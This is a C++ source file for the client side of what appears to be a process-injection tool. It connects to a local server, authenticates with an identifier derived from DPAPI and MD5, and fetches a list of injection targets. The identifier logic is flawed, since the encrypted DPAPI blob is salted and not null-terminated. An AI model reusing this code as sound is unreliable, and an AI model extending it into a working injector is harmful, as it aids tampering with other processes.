#include "stdafx.h"
#include "ServerHandler.h"
#include "md5.h"
#pragma comment(lib, "crypt32.lib")

using namespace std;
ServerHandler::ServerHandler()
{
	this->socketInit();
	this->connect("127.0.0.1", "5050");
	this->authenticate();
}


ServerHandler::~ServerHandler()
{
}

char * ServerHandler::createUid()
{
	DATA_BLOB DataIn;
	DATA_BLOB DataOut;
	DATA_BLOB DataVerify;
	BYTE *pbDataInput = (BYTE *)"\1\1";
	DWORD cbDataInput = strlen((char *)pbDataInput) + 1;
	DataIn.pbData = pbDataInput;
	DataIn.cbData = cbDataInput;
	CRYPTPROTECT_PROMPTSTRUCT PromptStruct;
	LPWSTR pDescrOut = NULL;

	ZeroMemory(&PromptStruct, sizeof(PromptStruct));
	PromptStruct.cbSize = sizeof(PromptStruct);
	PromptStruct.dwPromptFlags = CRYPTPROTECT_PROMPT_ON_PROTECT;
	PromptStruct.szPrompt = L"This is a user prompt.";

	CryptProtectData(
		&DataIn,
		NULL,
		NULL,
		NULL,
		NULL,
		CRYPTPROTECT_LOCAL_MACHINE | CRYPTPROTECT_UI_FORBIDDEN,
		&DataOut);
	return (char *)DataOut.pbData;
}

bool ServerHandler::authenticate()
{
	this->send((const char *)"INJECTOR HELLO");
	this->recv(1024);
	this->send((string("1 ") + string(md5(string(this->createUid())))).c_str());
	this->recv(1024);
	return true;
}

set<string>* ServerHandler::getRules()
{
	set<string> *injectToSet = new set<string>;

	Json::Value rules;
	this->send("5 GET RULES");
	string result = this->recv(1024);
	if (result == "4") // 4 = ERROR
		return nullptr;
	istringstream rulesStream(result);
	rulesStream >> rules;
	Json::Value injectTo = rules.get("inject_to", rules.null);
	if (injectTo.isNull())
		return nullptr;
	
	for (int i = 0; i < injectTo.size(); ++i)
	{
		injectToSet->insert(injectTo[i].asString());
	}

	return injectToSet;
}